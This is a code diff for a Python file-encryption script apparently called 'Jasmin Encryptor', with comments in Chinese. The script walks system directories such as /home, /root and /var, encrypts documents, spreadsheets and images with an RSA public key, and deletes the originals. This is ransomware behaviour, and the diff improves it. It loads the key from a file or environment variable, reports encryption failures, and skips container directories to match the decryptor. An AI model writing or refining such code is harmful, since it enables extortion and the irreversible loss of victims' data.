@@ -10,16 +10,32 @@ from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.backends import default_backend
 
-# ===== RSA公钥 (替换为你自己的) =====
-RSA_PUBLIC_PEM = b"""-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Z3VS5JJcds3xfn/ygWe
-hEhQLiP5RO2s5RCQTBKV9n0RUVMxNBMH8VEJnAEI8hnQpKr2LMV1TsXGBQX0FWv
-rVENBEYBqxE+a3DxVFpU8PQKA08W7HFv9p9b2vB9GrNLFkKN+CqXLzR7E7oLP8v8
-b7cHYrLKWD2IexLhkbR0FYFk2TZ4YOCYnvOSE91rPGJbQoTz+G6Acv1sGHHCvOGe
-IMPKjb8GRQHY0PrXuYt/0svbzN7g9r5yp+JBiDHjPn0mJMqZrs5ag1yrA+3e54G+
-WlE0AUsm6LcCPXGGY5EPnbjyY+oB5YOFh6xMZgbOGG+iH4VEEjm2aRaYFnSlJDuM
-3wIDAQAB
------END PUBLIC KEY-----"""
+# ===== RSA 公钥 =====
+# 绝不能内置固定公钥：此前这里是一把示例公钥（注释写着"替换为你自己的"但从未替换），
+# 用它加密的文件与本平台 keygen 生成的私钥永不匹配 —— 等于把数据锁死且无法恢复。
+# 现在必须显式提供：--pub <file> 或环境变量 JASMIN_PUB。
+def load_public_key_path():
+    import argparse
+    ap = argparse.ArgumentParser(description='Jasmin Encryptor')
+    ap.add_argument('--pub', help='RSA 公钥 PEM 文件路径（或设 JASMIN_PUB）')
+    ap.add_argument('dirs', nargs='*', help='要加密的目录，默认 6 个根目录')
+    a = ap.parse_args()
+    path = a.pub or os.environ.get('JASMIN_PUB') or ''
+    if not path:
+        for cand in (os.path.join(os.path.dirname(os.path.abspath(__file__)), 'jasmin_public.pem'),
+                     '/srv/jasmin_public.pem', '/opt/jasmin/jasmin_public.pem'):
+            if os.path.exists(cand):
+                path = cand
+                break
+    if not path or not os.path.exists(path):
+        sys.stderr.write('[!] 未找到 RSA 公钥。请用 --pub <file> 指定，或设置 JASMIN_PUB。\n')
+        sys.stderr.write('[!] 公钥在后台「生成RSA密钥对」后位于 payloads/jasmin_public.pem\n')
+        sys.exit(2)
+    pem = open(path, 'rb').read()
+    if b'PUBLIC KEY' not in pem:
+        sys.stderr.write('[!] %s 不是有效的 PEM 公钥\n' % path)
+        sys.exit(2)
+    return pem, a.dirs
 
 # ===== 排除规则 =====
 SKIP_DIRS = frozenset([
@@ -35,6 +51,7 @@ SKIP_NAMES = frozenset([
     'shadow','passwd','group','fstab',
     'grub.cfg','initrd','vmlinuz',
 ])
+PRUNE_DIRS = frozenset(['/var/lib/docker','/var/lib/containerd'])
 TARGET_EXTS = {
     '.pptx','.docx','.xlsx','.txt','.pdf','.csv',
     '.jpeg','.jpg','.png','.ppt','.doc','.xls',
@@ -96,22 +113,40 @@ def encrypt_file(path: str, rsa_pub_key) -> bool:
 
         os.remove(path)
         return True
-    except Exception:
+    except Exception as e:
+        # 静默吞掉异常会让"大面积失败"看起来像"已经加密完"（与 jasmin_diagnose.sh
+        # 声称的"新版会打印真实 errno"直接矛盾）
+        n = getattr(e, 'errno', None)
+        key = ('%s (errno=%s)' % (type(e).__name__, n)) if n is not None else type(e).__name__
+        FAILS[key] = FAILS.get(key, 0) + 1
+        if FAILS[key] == 1:
+            sys.stderr.write('[!] %s: %s\n' % (type(e).__name__, path))
         return False
 
+FAILS = {}
+
 def main():
-    pub_key = serialization.load_pem_public_key(RSA_PUBLIC_PEM, default_backend())
-    roots = ['/home', '/root', '/var', '/opt', '/tmp', '/srv']
+    pub_pem, cli_dirs = load_public_key_path()
+    pub_key = serialization.load_pem_public_key(pub_pem, default_backend())
+    roots = cli_dirs or ['/home', '/root', '/var', '/opt', '/tmp', '/srv']
     count = 0
     for r in roots:
         if not os.path.isdir(r):
             continue
-        for dirpath, _, files in os.walk(r):
+        for dirpath, dirs, files in os.walk(r):
+            # 与解密端保持一致：容器快照层不是目标数据，且会让遍历慢几个数量级。
+            # 加密时不管它、解密时又 prune 掉，那部分文件就永远解不回来。
+            dirs[:] = [d for d in dirs if os.path.join(dirpath, d) not in PRUNE_DIRS]
             for fname in files:
                 fp = os.path.join(dirpath, fname)
                 if encrypt_file(fp, pub_key):
                     count += 1
     print(f'[+] Encrypted {count} files')
+    if FAILS:
+        total = sum(FAILS.values())
+        print(f'[!] Failed on {total} file(s):', file=sys.stderr)
+        for k, v in sorted(FAILS.items(), key=lambda x: -x[1]):
+            print(f'[!]   {v} x {k}', file=sys.stderr)
 
 if __name__ == '__main__':
     main()
